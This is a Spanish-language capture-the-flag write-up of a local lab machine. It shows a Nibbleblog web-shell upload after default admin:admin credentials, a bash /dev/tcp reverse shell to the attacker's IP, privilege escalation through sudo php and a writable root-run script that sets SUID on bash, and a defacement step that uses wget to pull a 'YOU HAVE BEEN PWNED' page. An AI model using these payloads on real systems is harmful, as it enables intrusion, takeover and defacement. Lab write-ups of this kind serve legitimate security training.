
![[20250803170035.png]](chocolate-images/20250803170035.png)

# Fase de reconocimiento


empezamos con un escaneo básico de puertos con nmap

```bash
nmap -p- --open --min-rate 5000 -sS -vvv -n -Pn 172.17.0.2 -oG allPorts
```

Una vez sabemos los puertos que estan abiertos vamos a realizar un escaneo con scripts basicos de nmap para ver el servicio y la version que estan corriendo por detras

```bash
nmap -p80 -sCV 172.17.0.2 -oN targeted
```

![[20250803170335.png]](chocolate-images/20250803170335.png)

Vemos que el puerto 80 tiene un http así que vamos a ver que hay en la pagina web

![[20250803170407.png]](chocolate-images/20250803170407.png)

encontramos un index.html del apache lo que no nos dice gran cosa asi que vamos a ver el codigo fuente
pulsmos Ctrl + U para ver el codigo fuente y encontramos esto :

![[20250803170459.png]](chocolate-images/20250803170459.png)

vemos un directorio /nibbleblog asi que vamos a ver que esconde este directorio


![[20250803170536.png]](chocolate-images/20250803170536.png)

vemos esto lo que no nos aporta gran cosa asi que vamos a utilizar wfuzz para sacar archivos que esten dentro del nibbbleblog

```bash
wfuzz -c -w /usr/share/wordlists/dirb/common.txt --hc 404 http://172.17.0.2/nibbleblog/FUZZ
```

![[20250803170631.png]](chocolate-images/20250803170631.png)

podemos ver varias rutas interesantes entre ellas content, admin.php. README

vamos a explorarlas un poco 

![[20250803170729.png]](chocolate-images/20250803170729.png)

Admin.php contiene un panel de login en el que desconocemos las credenciales 

En Readme no hay gran cosa que destacar algo de informacion sobre el creador y poco mas

![[20250803171011.png]](chocolate-images/20250803171011.png)
En content como era de esperar vemos contenido de la pagina. donde vemos varias carpetas. voy adelantando que la que nos interesa es private donde encontraremos
![[20250803171107.png]](chocolate-images/20250803171107.png)

plugins y users.xml. En users.xml podremos ver el nombre de usuario "admin" pero no hay contraseña

## Panel de login

tratamos de hacer un ataque de dicccionario con hydra pero vemos que nos mete en una black list por exceso de intentos y encima da varios falsos positivos por lo que no nos sirve de mucho

entonces empiezo a probar credenciales sencillas por defecto a mano

admin:admin123, admin:password, admin:admin

En este caso las credenciales validas son admin:admin por lo que tenemos acceso a la pagina de configuracion de nibbleblog

![[20250803171448.png]](chocolate-images/20250803171448.png)

![[20250803171517.png]](chocolate-images/20250803171517.png)

aqui podeis ver a la izquierda las credenciales admin:admin y a la derecha los intentos que estuvo haciendo hydra

## Fase de Explotacion

Vamos a ir al apartado de plugins
![[20250803171637.png]](chocolate-images/20250803171637.png)

y vamos a instalar el plugin About.

![[20250803171658.png]](chocolate-images/20250803171658.png)

aqui subiremos un archivo con php malicioso que contenga lo siguiente 

```php
<?php system($_GET['fatality']); ?>
```

Pulsamos en guardar cambios y saldrán estos errores y abajo pondrá que los cambios se ejecutaron correctamente

![[20250803171818.png]](chocolate-images/20250803171818.png)

para comprobar si ha funcionado correctamente nuestro php malicioso iremos al directorio 

```bash
http://172.17.0.2/nibbleblog/content/private/plugins/about/
```

y veremos esto

![[20250803171927.png]](chocolate-images/20250803171927.png)

pulsamos en profile_picture.php

y en la URL pondremos:

```bash
http://172.17.0.2/nibbleblog/content/private/plugins/about/profile_picture.php?fatality=id
```
en mi caso al archivo con el php malicioso le puse de nombre fatality pero si tu lo llamaste "shell", "shadow", "cmd" tendras que poner :

```bash
http://172.17.0.2/nibbleblog/content/private/plugins/about/profile_picture.php?cmd=id
```

etc...


![[20250803172122.png]](chocolate-images/20250803172122.png)

vemos como ha funcionado y tenemos ejecución de comandos asi que vamos a lanzarnos una shell

en nuestra maquina de atacante nos ponemos en escucha en mi caso por el puerto 443 

```bash
nc -nlvp 443
```

y en la url de la pagina lanzamos una shell urlencodeada

```bash
172.17.0.2/nibbleblog/content/private/plugins/about/profile_picture.php?fatality=bash -c "bash -i %26>/dev/tcp/192.168.1.182/443 0>%261"
```

![[20250803172347.png]](chocolate-images/20250803172347.png)

y tendremos acceso al sistema como www-data

# Fase de post explotación

## tratamiento de shell

para trabajar mas comodos siempre que recibimos una shell por netcat vamos a realizar lo siguiente 

```bash
script /dev/null -c bash
```

Pulsamos Ctrl + Z para suspender la shell

```bash
stty raw -echo; fg
```

para recuperar la shell y exportamos el TERM

```bash
export TERM=xterm
```

ahora si podemos seguir con el ataque.

vamos a realizar el comando 

```bash
sudo -l
```

![[20250803172627.png]](chocolate-images/20250803172627.png)

vemos que podemos usar al usuario chocolate sin contraseña para ejecutar el bianrio php asi que vamos a buscar en GTFObins que podemos hacer con eso

![[20250803172709.png]](chocolate-images/20250803172709.png)

vemos que podemos conseguir una shell como el usuario chocolate asi que vamos a probar

```bash
CMD="/bin/bash"
```

y despues 

```bash
sudo -u chocolate php -r "system('$CMD');"
```
![[20250803172837.png]](chocolate-images/20250803172837.png)

ahí ya tenemos acceso como chocolate ahora vamos a buscar la manera de llegar a root

vamos a utilizar ps para ver los procesos que están ejecutándose en el sistema 

```bash
ps -faux
```

![[20250803172953.png]](chocolate-images/20250803172953.png)

aqui vemos que root esta ejecutando /opt/script.php asi que vamos a ver quien tiene permisos sobre ese php

```bash
ls -l /opt/script.php
```

![[20250803173050.png]](chocolate-images/20250803173050.png)

ahi vemos que chocolate tiene permisos de escritura sobre el archivo asi que vamos a inyectarle una orden maliciosa

```bash
echo '<?php exec("chmod u+s /bin/bash"); ?>' > /opt/script.php
```

con esto haremos que el bianrio /bin/bash tenga permisos SUID por lo que podremos usarlo como root y asi escalar los privilegios

si revisamos el binario /bin/bash podremos ver que ahora tiene permisos SUID

![[20250803173313.png]](chocolate-images/20250803173313.png)

asi que utilizamos el comando 

```bash
bash -p
```

![[20250803173353.png]](chocolate-images/20250803173353.png)

y ya tendríamos acceso a la maquina como root


# Extra

Ahora como un buen hacker vamos a aprovechar que la maquina esta en local y que al ser de Docker Labs no tiene Flags para dejar nuestra huella 

vamos a crear un html en nuestro equipo en local.

```html
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>You Have Been Pwned</title>
<style>
    body {
        margin: 0;
        padding: 0;
        background: black;
        color: white;
        font-family: 'Courier New', monospace;
        display: flex;
        flex-direction: column;
        align-items: center;
        justify-content: center;
        height: 100vh;
        overflow: hidden;
    }

    .container {
        position: relative;
        text-align: center;
        z-index: 2;
    }

    .glitch {
        font-size: 3rem;
        font-weight: bold;
        color: #fff;
        position: relative;
        animation: glitch 1s infinite;
    }

    @keyframes glitch {
        0% { text-shadow: 2px 0 red, -2px 0 cyan; }
        20% { text-shadow: -2px 0 red, 2px 0 cyan; }
        40% { text-shadow: 2px 0 red, -2px 0 cyan; }
        60% { text-shadow: -2px 0 red, 2px 0 cyan; }
        80% { text-shadow: 2px 0 red, -2px 0 cyan; }
        100% { text-shadow: -2px 0 red, 2px 0 cyan; }
    }

    .panda {
        max-width: 90%;
        max-height: 80vh;
        margin-top: 20px;
        animation: float 3s ease-in-out infinite;
    }

    @keyframes float {
        0% { transform: translateY(0px); }
        50% { transform: translateY(-10px); }
        100% { transform: translateY(0px); }
    }
</style>
</head>
<body>
    <div class="container">
        <div class="glitch">YOU HAVE BEEN PWNED</div>
        <img src="panda.png" alt="CyberHack Panda" class="panda">
    </div>
</body>
</html>

```

y ahora con chatGpt crearemos una imagen yo aprovechando que el fondo de pantalla que uso es este

![[20250803175806.png]](chocolate-images/20250803175806.png)

voy a modificarlo para que quede asi

![[20250803175841.png]](chocolate-images/20250803175841.png)

y esto sera lo que vera la "victima"

en nuestra maquina atacante crearemos una carpeta que contenga estas 2 cosas 
![[20250803175927.png]](chocolate-images/20250803175927.png)

el index.html y la imagen que queramos poner 

a continuación abrimos con python un servidor local por el puerto 8081 por ejemplo

```bash
python3 -m http.server 8081
```

## Maquina victima 

ahora desde la maquina victima una vez somos root vamos a ir al directorio `/var/www/html`

y ejecutaremos estos dos comandos

```bash
wget http://192.168.1.182:8081/index.html -O index.html
```

```bash
wget http://192.168.1.182:8081/panda.png -O panda.png
```

tendreis que poner vuestra ip el puerto que abristeis y el nombre de la imagen que hayáis puesto en el html

```bash
wget http://<IP ATACANTE>:<PUERTO ELEGIDO>/<IMAGEN>.png -O <IMAGEN>.png
```

Y esto quedaria asi

## RESULTADO

![[20250803180311.png]](chocolate-images/20250803180311.png)

la imagen tiene movimiento pero solo puedo dejaros una captura de pantalla os animo a probarlo y compartir vuestros resultados.
